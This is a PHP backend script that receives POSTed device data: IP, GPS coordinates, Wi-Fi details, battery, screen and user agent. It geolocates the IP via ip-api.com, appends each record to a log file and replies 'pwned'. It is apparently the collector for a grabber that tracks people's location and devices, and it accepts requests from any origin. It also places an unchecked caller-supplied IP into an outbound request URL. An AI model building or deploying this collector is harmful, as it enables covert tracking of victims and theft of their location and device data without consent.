<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST,GET,OPTIONS');
header('Access-Control-Allow-Headers: *');

if($_SERVER['REQUEST_METHOD']==='POST'){
    $data=json_decode(file_get_contents('php://input'),true);
    $ip=$data['ip']??$_SERVER['REMOTE_ADDR'];
    
    // IP GEO
    $geojson=@file_get_contents("http://ip-api.com/json/$ip?fields=status,message,country,city,regionName,isp,org,lat,lon,timezone");
    $geo=json_decode($geojson,true);
    
    $gps=$data['gps']??'no-gps';
    $wifi=$data['wifi']??'unknown';
    $log=sprintf(
        "[%s] IP:%s | %s,%s | ISP:%s | GPS:%s | WIFI:%s | BAT:%s%% | SCREEN:%s | UA:%s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $geo['city']??'unknown',
        $geo['country']??'unknown',
        $geo['isp']??'unknown',
        $gps,
        $wifi,
        $data['battery']??'unknown',
        $data['screen']??'unknown',
        substr($data['ua']??'',0,80)
    );
    
    @mkdir('data',0755,true);
    file_put_contents('data/logs.txt',$log,FILE_APPEND|LOCK_EX);
    echo json_encode(['status'=>'pwned']);
}
?>
